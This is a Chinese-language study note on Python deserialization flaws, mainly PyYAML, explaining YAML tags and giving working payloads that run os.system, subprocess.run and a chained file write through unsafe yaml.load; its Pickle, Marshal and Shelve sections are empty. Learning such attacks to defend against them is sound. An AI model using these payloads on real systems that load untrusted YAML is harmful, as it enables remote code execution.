---
title: Python反序列化学习笔记
date: 2025-07-16
---
[[toc]]
## 参考资料
- [ascotbe的代码审计笔记](https://www.ascotbe.com/2022/09/22/Python)
- [PyYaml官方文档](https://pyyaml.org/wiki/PyYAMLDocumentation)
***
:::info 什么是**序列化**和**反序列化**
- **序列化 (Serialization)**: 将内存中的Python对象（如字典、列表、自定义类的实例）转换成一种可存储或可传输的格式（如字符串、字节流）。
- **反序列化 (Deserialization)**: 将序列化后的字符串或字节流，恢复成原来的Python对象。
:::

## PyYaml反序列化
YAML作为一种数据格式，比JSON功能更强大。它不仅能表示基本的数据类型（字符串、数字、列表、字典），**还能表示复杂的数据类型，比如一个类的实例**。
### Hello World
:::tip
对于Python对象或其他自定义数据类型，PyYaml允许使用自定义标签。这些标签通常以`!!python/object:`开头，后跟Python模块和类的完全限定名。
:::
```Yaml
# 类实例表示 (PyYAML扩展)  
python_object: !!python/object:__main__.Person  
  name: Bob  
  age: 35  
  children:  
    - !!python/object:__main__.Person  
      name: Alice  
      age: 10  
    - !!python/object:__main__.Person  
      name: Tom  
      age: 8
```
![](assets/Pasted%20image%2020250716233840.png)

为了能够将YAML数据完美地恢复（反序列化）成一个Python对象，yaml.load()需要能够：
1. 找到这个对象所属的类。
2. 调用这个类的构造函数 (__init__) 或其他方法来创建实例。
（上面的自定义Yaml实例配置就需要在程序上下文中有一个**同名**的类）

:::tip 什么是`tags`
标签通常用于标记Yaml节点的类型，下面是Python限定标签（右边的列表示的是**对应的Python值类型**）
![](assets/Pasted%20image%2020250716234955.png)
:::

### 五个核心`tags`
攻击者通过在YAML文件中使用特定的标签（Tags）来指定要执行的动作。最核心的标签是 `!!python/object/apply:`。它的作用是：告诉PyYAML去加载一个指定的Python模块，并调用其中的某个函数。

以下是Payload中可能用到的五个标签
```yaml
!!python/name:<类名> # 返回类的名称 
!!python/module:<包名>.<模块名> # 返回一个模块
!!python/object:<模块名>.<类名> <用于实例化一个类的参数> # 返回一个实例
!!python/object/new:<模块名>.<类名> <用于实例化一个类的参数> # 返回类的实例
!!python/object/apply:<模块名>.<函数名> <传入该函数的参数> # 返回函数的返回值
```
#### 可直接执行命令的`tags`
```yaml
!!python/object/new:<模块名>.<类名> <用于实例化一个类的参数> # 返回类的实例
!!python/object/apply:<模块名>.<函数名> <传入该函数的参数> # 返回函数的返回值
```

```Python
# Python 3.7.5 | PyYaml 3.13
pyyaml_object_new_payload = """
!!python/object/new:os.system [whoami]
""" # 包裹命令的引号是可选的

pyyaml_object_new_payload = """
!!python/object/new:os.system
- \"whoami\"
"""

pyyaml_object_new_payload = """
!!python/object/new:os.system
    args: [\"whoami\"]
"""

yaml.load(pyyaml_object_new_payload, Loader=yaml.Loader)
```
:::info 注意PyYaml的版本
`PyYaml 4.2b4`的`Loader`已无法触发命令；`PyYaml 3.13`则尚未加入`FullLoader`和`BaseLoader`。
:::

`!python/object/apply:`同理，但要注意传参类型：
```Python
pyyaml_object_apply_payload = """
!!python/object/apply:os.system
 [\"whoami\"]
""" # 这里就不可以是yaml列表了

pyyaml_object_apply_payload = """
!!python/object/apply:os.system
   args: [\"whoami\"]
"""
# 使用更强大的subprocess
pyyaml_object_apply_payload="""
!!python/object/apply:subprocess.run
- ["arp", "-a"] 
""" # 将命令和参数作为列表传递

yaml.load(pyyaml_object_apply_payload, Loader=yaml.Loader)
```

`!!python/object/apply`亦可以用来写shell，但稍微复杂点：
```yaml
!!python/object/apply:builtins.open
- "/tmp/shell.txt"  # 要写入的文件路径
- "w"               # 文件模式为写入
- !!python/object/apply:__builtin__.getattr
  - !!python/object/apply:__builtin__.str
    - "Hello, you have been hacked!" # 文件内容
  - "write"

# 模拟open('/tmp/shell.txt', 'w').write('Hello...')
```


#### 不可直接执行命令的`tags`
```yaml
!!python/name:<类名> # 返回类的名称 
!!python/module:<包名>.<模块名> # 返回一个模块
!!python/object:<模块名>.<类名> <用于实例化一个类的参数> # 返回一个实例
```
## Pickle反序列化
## Marshal反序列化
## Shelve反序列化
## 花絮
![](assets/Pasted%20image%2020250718001214.png)
尝试链式调用读取文件但是失败了
***
## 页面尾部